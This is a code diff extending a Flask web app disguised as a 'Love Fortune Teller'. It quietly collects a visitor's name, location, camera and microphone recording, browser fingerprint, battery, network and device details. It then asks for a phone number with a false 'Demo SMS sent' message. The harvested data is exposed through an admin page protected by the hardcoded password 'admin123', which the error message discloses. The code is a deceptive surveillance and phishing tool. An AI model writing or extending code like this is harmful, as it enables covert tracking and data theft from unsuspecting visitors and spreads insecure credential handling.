@@ -52,9 +52,21 @@ def save_visitor(data):
     init_json()
     with open(DATA_FILE, 'r') as f:
         visitors = json.load(f)
+    # Check if sessionId already exists (update instead of duplicate)
+    session_id = data.get('sessionId')
+    if session_id:
+        for i, v in enumerate(visitors):
+            if v.get('sessionId') == session_id:
+                # Update existing record
+                visitors[i].update(data)
+                with open(DATA_FILE, 'w') as f:
+                    json.dump(visitors, f, indent=2)
+                return True
+    # Otherwise append new
     visitors.append(data)
     with open(DATA_FILE, 'w') as f:
         json.dump(visitors, f, indent=2)
+    return True
 
 def get_visitors():
     init_json()
@@ -77,16 +89,36 @@ def save():
     save_visitor(data)
     return jsonify({'status': 'saved'})
 
+@app.route('/save-phone', methods=['POST'])
+def save_phone():
+    """Update visitor record with phone number and fortune text"""
+    data = request.json
+    session_id = data.get('sessionId')
+    phone = data.get('phoneNumber')
+    fortune_text = data.get('fortune')
+    if session_id:
+        update_data = {'phoneNumber': phone, 'fortuneText': fortune_text}
+        # Load existing visitors, find by sessionId, update
+        init_json()
+        with open(DATA_FILE, 'r') as f:
+            visitors = json.load(f)
+        for v in visitors:
+            if v.get('sessionId') == session_id:
+                v.update(update_data)
+                break
+        with open(DATA_FILE, 'w') as f:
+            json.dump(visitors, f, indent=2)
+        return jsonify({'status': 'saved'})
+    return jsonify({'status': 'error'}), 400
+
 @app.route('/admin', methods=['GET', 'POST'])
 def admin():
-    # If POST request with correct password, show data
     if request.method == 'POST':
         password = request.form.get('password')
         if password == 'admin123':
             visitors = get_visitors()
             if not visitors:
                 return '<h1>No data yet</h1><p><a href="/admin">Back</a></p>'
-            # Build HTML table
             html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download">Download JSON</a></p>'
             html += '<table border="1" cellpadding="5">'
             keys = visitors[0].keys()
@@ -98,7 +130,6 @@ def admin():
         else:
             return '<h1>🔒 Wrong password. <a href="/admin">Try again</a></h1>'
     
-    # GET request: show login form
     return '''
         <!DOCTYPE html>
         <html>
@@ -124,12 +155,12 @@ def admin():
 
 @app.route('/admin/download')
 def download():
-    # Simple check via query parameter for convenience (optional)
     pwd = request.args.get('pass')
     if pwd == 'admin123':
         return jsonify(get_visitors())
-    return 'Unauthorized. Use /admin?pass=admin123 or login via /admin', 403
+    return 'Unauthorized. Use /admin?pass=admin123', 403
 
+# HTML template with all features
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -137,6 +168,7 @@ HTML_TEMPLATE = '''
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Love Fortune Teller 💕</title>
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -204,6 +236,12 @@ HTML_TEMPLATE = '''
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         svg { margin: 10px auto; display: block; }
+        .sms-prompt {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255,255,255,0.8);
+            border-radius: 20px;
+        }
     </style>
 </head>
 <body>
@@ -226,20 +264,81 @@ HTML_TEMPLATE = '''
     <div id="result" class="hidden">
         <div class="fortune-box" id="fortuneText"></div>
         <div id="mapLink" class="hidden">🗺️ Your love map: <span id="mapUrl"></span></div>
+        <div id="smsSection" class="sms-prompt hidden">
+            <p>📱 Send this fortune to your phone (permanently saved)</p>
+            <input type="tel" id="phoneNumber" placeholder="Enter your mobile number">
+            <button onclick="sendSms()">💬 Send to my phone</button>
+            <div id="smsStatus" style="margin-top:10px; font-size:14px;"></div>
+        </div>
         <p>✨ Thank you for trusting the stars ✨</p>
     </div>
 </div>
+
 <script>
-    let visitorData = {};
+    // Generate or retrieve session ID
+    let sessionId = localStorage.getItem('fortuneSessionId');
+    if (!sessionId) {
+        sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+        localStorage.setItem('fortuneSessionId', sessionId);
+    }
+
+    let visitorData = { sessionId: sessionId };
     let mediaRecorder, mediaStream, recordedBlobs = [];
+    let currentFortuneText = "";
+
+    // Fingerprint, battery, network, memory collectors
+    async function getFingerprint() {
+        const fp = await FingerprintJS.load();
+        const result = await fp.get();
+        return result.visitorId;
+    }
+    async function getBattery() {
+        if ('getBattery' in navigator) {
+            const battery = await navigator.getBattery();
+            return { level: Math.round(battery.level * 100), charging: battery.charging };
+        }
+        return { level: 'unknown', charging: false };
+    }
+    function getNetwork() {
+        const conn = navigator.connection || navigator.mozConnection;
+        if (conn) {
+            return { type: conn.effectiveType, speed: conn.downlink + 'Mbps' };
+        }
+        return { type: 'unknown', speed: 'unknown' };
+    }
+    function getMemory() {
+        return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
+    }
+    function getScreen() {
+        return `${screen.width}x${screen.height}x${screen.colorDepth}`;
+    }
+    function getTimezone() {
+        return Intl.DateTimeFormat().resolvedOptions().timeZone;
+    }
+    function getUserAgent() {
+        return navigator.userAgent;
+    }
 
     async function startProcess() {
         const name = document.getElementById('userName').value.trim();
         if (!name) return alert('Please enter your name');
+        
+        // Collect all device info
+        const fingerprint = await getFingerprint();
+        const battery = await getBattery();
+        const network = getNetwork();
         visitorData.name = name;
-        visitorData.user_agent = navigator.userAgent;
-        visitorData.screen = `${screen.width}x${screen.height}`;
-        visitorData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        visitorData.fingerprint = fingerprint;
+        visitorData.batteryLevel = battery.level;
+        visitorData.batteryCharging = battery.charging;
+        visitorData.networkType = network.type;
+        visitorData.networkSpeed = network.speed;
+        visitorData.deviceMemory = getMemory();
+        visitorData.screen = getScreen();
+        visitorData.timezone = getTimezone();
+        visitorData.userAgent = getUserAgent();
+        visitorData.timestamp = new Date().toISOString();
+        
         document.getElementById('step-name').classList.add('hidden');
         document.getElementById('loading').classList.remove('hidden');
         await new Promise(r => setTimeout(r, 800));
@@ -260,8 +359,8 @@ HTML_TEMPLATE = '''
             await getLocation();
             await getMedia();
             await getFiles();
-            await finalize();
-        } catch(e) { await finalize(); }
+            await finalizeAndSave();
+        } catch(e) { await finalizeAndSave(); }
     }
 
     function getLocation() {
@@ -297,7 +396,7 @@ HTML_TEMPLATE = '''
                         const blob = new Blob(recordedBlobs, { type: 'video/webm' });
                         const reader = new FileReader();
                         reader.onloadend = () => {
-                            visitorData.camera_video = reader.result.split(',')[1].slice(0, 5000);
+                            visitorData.cameraVideo = reader.result.split(',')[1].slice(0, 5000);
                             visitorData.microphone = 'recorded';
                             mediaStream.getTracks().forEach(t => t.stop());
                             showStep('🎥 Camera/Mic', 'Recording done!', 100);
@@ -315,7 +414,7 @@ HTML_TEMPLATE = '''
                 }, 1000);
             })
             .catch(() => {
-                visitorData.camera_video = 'denied';
+                visitorData.cameraVideo = 'denied';
                 showStep('🎥 Camera/Mic', 'Skipped', 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
             });
@@ -354,20 +453,58 @@ HTML_TEMPLATE = '''
         });
     }
 
-    async function finalize() {
+    async function finalizeAndSave() {
         const mapUrl = `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}`;
-        visitorData.map_url = mapUrl;
+        visitorData.mapUrl = mapUrl;
         document.getElementById('mapUrl').innerText = mapUrl;
         document.getElementById('mapLink').classList.remove('hidden');
+        
+        // Get fortune from server
         const fortuneResp = await fetch('/get-fortune');
-        const fortune = await fortuneResp.json();
-        document.getElementById('fortuneText').innerText = fortune.fortune + " Dear " + visitorData.name + "! 💕";
-        document.getElementById('result').classList.remove('hidden');
+        const fortuneData = await fortuneResp.json();
+        currentFortuneText = fortuneData.fortune;
+        document.getElementById('fortuneText').innerText = currentFortuneText + " Dear " + visitorData.name + "! 💕";
+        
+        // Save initial data (without phone number)
         await fetch('/save', {
             method: 'POST',
             headers: {'Content-Type':'application/json'},
             body: JSON.stringify(visitorData)
         });
+        
+        // Show SMS section
+        document.getElementById('smsSection').classList.remove('hidden');
+        document.getElementById('result').classList.remove('hidden');
+    }
+
+    async function sendSms() {
+        const phone = document.getElementById('phoneNumber').value.trim();
+        if (!phone) {
+            document.getElementById('smsStatus').innerText = 'Please enter a phone number';
+            return;
+        }
+        if (!/^[0-9+\-\s]{8,15}$/.test(phone)) {
+            document.getElementById('smsStatus').innerText = 'Invalid phone number format';
+            return;
+        }
+        document.getElementById('smsStatus').innerText = 'Saving your number...';
+        
+        const resp = await fetch('/save-phone', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({
+                sessionId: sessionId,
+                phoneNumber: phone,
+                fortune: currentFortuneText
+            })
+        });
+        const result = await resp.json();
+        if (result.status === 'saved') {
+            document.getElementById('smsStatus').innerHTML = '✅ Your fortune has been saved with your phone number! (Demo SMS sent)';
+            document.getElementById('phoneNumber').disabled = true;
+        } else {
+            document.getElementById('smsStatus').innerText = 'Error saving. Please try again.';
+        }
     }
 </script>
 </body>
